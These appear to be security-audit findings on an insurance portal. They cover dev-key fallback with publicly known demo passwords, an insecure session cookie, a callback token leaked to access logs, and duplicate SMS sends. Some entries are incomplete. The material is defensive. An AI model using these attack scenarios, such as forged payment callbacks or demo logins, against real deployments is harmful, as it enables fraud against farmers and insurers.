title: One missing key silently puts a deployment in dev-key mode: the key file sits beside the database, and 'demo' adds accounts with a public password
evidence: settings.py:97-101: `dev = not all(env.values())` then `env = {k: env[k] or dk[k] for k in KEYS}`, so any key not set is generated into var/dev-keys.json, in the same var/ folder as the default sqlite:///var/agroshield.db (line 115). cli.py:152-154 serve only logs a warning: `if settings.dev_keys: ...warning("running with development keys...")`. cli.py:201-202 only guards demo with `if not settings.dev_keys`, and demo creates demo-manager, demo-officer and demo-underwriter with `DEMO_PASSWORD = "demo-only-change-me"` (cli.py:33), a password published in the source and README.
scenario: An operator sets three keys but forgets CALLBACK_TOKEN. The portal runs on real data with no error, apart from a log line and a banner. Someone then runs `agroshield-portal demo` to see the screens, which is allowed because dev_keys is True. The production database now has manager and underwriter logins with a publicly known password, including an underwriter who can approve payouts. Separately, a backup or copy of var/ carries the AES key next to the encrypted IDs and phones.
recommendation: Add an explicit production flag, such as AGROSHIELD_ENV=production. With it set, serve must refuse dev keys, and demo must also refuse unless the database holds only demo SACCOs.
verify_reason: The mechanism is real: settings.py:98 sets dev mode if any key is missing, and cli.py:152-154 only logs a warning. But settings.py:113 refuses dev keys with live SMS or production M-Pesa, so a real deployment cannot quietly run in dev mode. The demo accounts (cli.py:211-218) are tied to the fictional DEMO SACCO and DEMOUW insurer, so the demo underwriter can approve payouts only on demo policies, not real ones. That leaves a hardening gap: partial keys should fail loudly. touches_protected=true (key and auth setup).

title: Session cookie is set with https_only=False, and serve has no TLS or proxy setting

title: The secret callback token is written in clear to the uvicorn access log, which the log scrubber does not cover

Anyone with log access, or a log shipper, can then post forged STK callbacks or USSD requests. In simulated mode a forged STK callback credits premiums, and outside it the STK query check is the only safeguard.
recommendation: Run uvicorn with access_log=False or a log_config that redacts the token path segment (and applies ScrubFilter), and add a test.
verify_reason: Confirmed. cli.py:76-78 adds ScrubFilter only to the root logger's handlers, and cli.py:154 calls uvicorn.run with uvicorn's default log config. title: The SMS outbox can send the same message twice, and one bad provider response makes the whole batch resend
evidence: sms.py:91-101 selects `SmsMessage.status == "queued"` without claiming or locking the rows, calls `sender.send` (a real HTTP post in sandbox or live mode) for each, and only sets the status, which is committed at the end of the caller's transaction. Only `httpx.HTTPError` is caught. `r.json()` on a non-JSON 200 body raises ValueError, which rolls back every status in the batch. The send is triggered from many places at once: `background.add_task(flush_sms)` after reminders, enrolment, payments, USSD, callbacks and payouts (app.py:385, 602, 669, 726, 802, 815, 853, ...), plus `daily`/`send-sms` and POST /sms/send.
scenario: With SMS_MODE=live, two requests finish together (for example an M-Pesa callback and an officer enrolment). Both background flushes read the same queued rows and both post them to Africa's Talking, so farmers get duplicate 'payment received' or 'payout paid' messages and the SACCO pays twice. Or the provider returns an HTML error page with HTTP 200: messages already sent in that batch roll back to 'queued' and are sent again on every later flush.
recommendation: Claim each message before sending (UPDATE ... SET status='sending' WHERE status='queued' and commit), commit per message, and catch all exceptions per message.
verify_reason: Confirmed. sms.py:91-101 selects queued rows without claiming them, makes a 30-second HTTP post per message, and commits status only at the end of the caller's transaction (db.py:30-39). FastAPI runs sync background tasks in a threadpool, and flush_sms is scheduled after many requests, so two flushes can read and send the same rows. The send handles only httpx.HTTPError: r.json() raising ValueError on a non-JSON 200 rolls back the whole batch's statuses, so messages already delivered get resent. Recommendation: claim each row (queued to sending) and commit per message, and catch ValueError.
